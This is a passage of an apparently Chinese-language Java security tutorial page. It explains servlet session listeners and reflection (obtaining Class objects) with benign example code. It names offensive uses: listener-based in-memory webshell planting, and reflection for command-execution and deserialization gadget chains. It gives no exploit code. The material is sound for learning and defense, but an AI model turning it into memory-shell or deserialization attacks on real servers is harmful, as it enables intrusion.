<div class="code-block-container" id="code-1769750397316954700" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397316954700">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397316954700" title="Toggle" aria-expanded="false" aria-controls="code-1769750397316954700" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397316954700-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@WebListener</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">ListenSession</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">HttpSessionListener</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">sessionCreated</span><span class="p">(</span><span class="n">HttpSessionEvent</span><span class="w"> </span><span class="n">se</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 监听检测有Session创建就会执行这里</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;监听器监听到了session创建&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">sessionDestroyed</span><span class="p">(</span><span class="n">HttpSessionEvent</span><span class="w"> </span><span class="n">se</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 监听检测有Session销毁就会执行这里</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;监听器监听到了session销毁&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p>@WebListener: 通过此注解，标记这是一个监听器类。<br>
@Override 注解用于表示下面的方法是对接口中方法的重写。<br>
public void sessionCreated(HttpSessionEvent se): 当有新的 HttpSession 被创建时，这个方法会被调用。在这里，它简单地输出一条日志表示监听器检测到了session的创建。<br>
public void sessionDestroyed(HttpSessionEvent se): 当一个 HttpSession 被销毁时，这个方法会被调用。在这里，它简单地输出一条日志表示监听器检测到了session的销毁。</p>
<h3 id="3监听器触发流程">3、监听器触发流程<a hidden class="anchor" aria-hidden="true" href="#3监听器触发流程">#</a></h3>
<p>在Java Web应用中，监听器用于监控和响应特定的事件。对于监听器的触发流程，以下是一般的步骤：</p>
<div class="code-block-container" id="code-1769750397318579900" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397318579900">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">plain</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397318579900" title="Toggle" aria-expanded="false" aria-controls="code-1769750397318579900" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397318579900-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
</span><span class="lnt" id="2"><span class="lnlinks">2</span>
</span><span class="lnt" id="3"><span class="lnlinks">3</span>
</span><span class="lnt" id="4"><span class="lnlinks">4</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">@WebListener
</span></span><span class="line"><span class="cl">&lt;listener&gt;
</span></span><span class="line"><span class="cl">.......
</span></span><span class="line"><span class="cl">&lt;/listener&gt;</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p>注册监听器：<br>
在Web应用中，你需要将监听器注册到相应的组件上。例如，在web.xml文件中配置监听器，或者使用注解（如@WebListener）标记监听器类。<br>
事件发生：<br>
当与监听器关联的特定事件在Web应用中发生时，监听器会被触发。<br>
调用监听器方法：<br>
监听器类中实现的相应方法（如sessionCreated、sessionDestroyed等）将被调用。这些方法包含与事件相关的信息，允许监听器执行特定的逻辑。<br>
执行自定义逻辑：<br>
在监听器方法中，你可以编写自定义的逻辑以响应事件。这可能包括记录日志、修改数据、发送通知等。<br>
举例来说，对于HttpSessionListener：</p>
<p>当一个新的HttpSession被创建时，sessionCreated方法将被调用。<br>
当一个HttpSession被销毁时，sessionDestroyed方法将被调用。<br>
总的来说，监听器提供了一种在Web应用中对特定事件进行响应的机制，使开发者能够以声明性的方式处理应用的生命周期事件。</p>
<h3 id="4监听器安全场景">4、监听器安全场景<a hidden class="anchor" aria-hidden="true" href="#4监听器安全场景">#</a></h3>
<p>代码审计中分析执行逻辑触发操作，红队内存马植入，蓝队清理内存马等</p>
<h1 id="34-反射机制">34-反射机制<a hidden class="anchor" aria-hidden="true" href="#34-反射机制">#</a></h1>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300902693.png" style="max-width: 100%; height: auto;"></p>
<h2 id="java-反射-概念">Java-反射-概念<a hidden class="anchor" aria-hidden="true" href="#java-反射-概念">#</a></h2>
<p>1、什么是Java反射<br>
参考：<a href="https://xz.aliyun.com/t/9117">https://xz.aliyun.com/t/9117</a><br>
Java提供了一套反射API，该API由Class类与java.lang.reflect类库组成。该类库包含了Field、Method、Constructor等类。</p>
<p><strong>反射机制：对成员变量，成员方法和构造方法的信息进行的编程操作。</strong></p>
<p>2、为什么要用到反射<br>
参考：<a href="https://xz.aliyun.com/t/9117">https://xz.aliyun.com/t/9117</a></p>
<p><strong>动态</strong>的创建、修改、调用、获取其属性，而不需要事先知道运行的对象是谁。<strong>划重点：在运行时而不是编译时。</strong></p>
<p>.java	&ndash;&gt;	.class</p>
<p>3、反射机制应用<br>
开发应用场景：<br>
Spring框架的IOC基于反射创建对象和设置依赖属性。<br>
SpringMVC的请求调用对应方法，也是通过反射。<br>
JDBC的Class#forName(String className)方法，也是使用反射。</p>
<p>安全应用场景：<br>
构造利用链，触发命令执行<br>
反序列化中的利用链构造<br>
动态获取或执行任意类中的属性或方法<br>
动态代理的底层原理是反射技术<br>
rmi反序列化也涉及到反射操作</p>
<h2 id="类对象">类对象<a hidden class="anchor" aria-hidden="true" href="#类对象">#</a></h2>
<h4 id="class对象类获取">Class对象类获取<a hidden class="anchor" aria-hidden="true" href="#class对象类获取">#</a></h4>
<div class="code-block-container" id="code-1769750397319138100" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397319138100">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397319138100" title="Toggle" aria-expanded="false" aria-controls="code-1769750397319138100" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397319138100-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span><span class="lnt" id="26"><span class="lnlinks">26</span>
</span><span class="lnt" id="27"><span class="lnlinks">27</span>
</span><span class="lnt" id="28"><span class="lnlinks">28</span>
</span><span class="lnt" id="29"><span class="lnlinks">29</span>
</span><span class="lnt" id="30"><span class="lnlinks">30</span>
</span><span class="lnt" id="31"><span class="lnlinks">31</span>
</span><span class="lnt" id="32"><span class="lnlinks">32</span>
</span><span class="lnt" id="33"><span class="lnlinks">33</span>
</span><span class="lnt" id="34"><span class="lnlinks">34</span>
</span><span class="lnt" id="35"><span class="lnlinks">35</span>
</span><span class="lnt" id="36"><span class="lnlinks">36</span>
</span><span class="lnt" id="37"><span class="lnlinks">37</span>
</span><span class="lnt" id="38"><span class="lnlinks">38</span>
</span><span class="lnt" id="39"><span class="lnlinks">39</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//User.java</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">User</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//成员变量</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="s">&#34;xiaodi&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">age</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">31</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">gender</span><span class="o">=</span><span class="s">&#34;man&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">job</span><span class="o">=</span><span class="s">&#34;sec&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//构造方法</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">User</span><span class="p">(){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//System.out.println(&#34;无参数&#34;);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">User</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;我的名字&#34;</span><span class="o">+</span><span class="n">name</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="nf">User</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="kt">int</span><span class="w"> </span><span class="n">age</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">name</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">age</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//成员方法</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">userinfo</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="kt">int</span><span class="w"> </span><span class="n">age</span><span class="p">,</span><span class="n">String</span><span class="w"> </span><span class="n">gender</span><span class="p">,</span><span class="n">String</span><span class="w"> </span><span class="n">job</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">job</span><span class="o">=</span><span class="n">job</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">age</span><span class="o">=</span><span class="n">age</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">gender</span><span class="o">=</span><span class="n">gender</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">users</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="n">String</span><span class="w"> </span><span class="n">gender</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">gender</span><span class="o">=</span><span class="n">gender</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;users成员方法：&#34;</span><span class="o">+</span><span class="n">name</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;users成员方法：&#34;</span><span class="o">+</span><span class="n">gender</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p>类获取方法：</p>
<div class="code-block-container" id="code-1769750397327900500" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397327900500">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397327900500" title="Toggle" aria-expanded="false" aria-controls="code-1769750397327900500" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397327900500-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span><span class="lnt" id="26"><span class="lnlinks">26</span>
</span><span class="lnt" id="27"><span class="lnlinks">27</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//GetClass.java</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example.reflectdemo1</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">GetClass</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//1、根据全限定类名：Class.forName(“全路径类名”)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">aClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;com.example.reflectdemo1.User&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">aClass</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//2、根据类名：类名.class</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">userClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">User</span><span class="p">.</span><span class="na">class</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">userClass</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//3、根据对象：对象.getClass()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">User</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">User</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">aClass1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">user</span><span class="p">.</span><span class="na">getClass</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">aClass1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//4、通过类加载器获得Class对象：</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//ClassLoader.getSystemClassLoader().loadClass(&#34;全路径类名&#34;);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClassLoader</span><span class="w"> </span><span class="n">clsload</span><span class="o">=</span><span class="n">ClassLoader</span><span class="p">.</span><span class="na">getSystemClassLoader</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">aClass2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clsload</span><span class="p">.</span><span class="na">loadClass</span><span class="p">(</span><span class="s">&#34;com.example.reflectdemo1.User&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">aClass2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901924.png" style="max-width: 100%; height: auto;"></p>
<h4 id="field成员变量类获取">Field成员变量类获取<a hidden class="anchor" aria-hidden="true" href="#field成员变量类获取">#</a></h4>
<div class="code-block-container" id="code-1769750397333757100" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397333757100">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397333757100" title="Toggle" aria-expanded="false" aria-controls="code-1769750397333757100" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397333757100-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
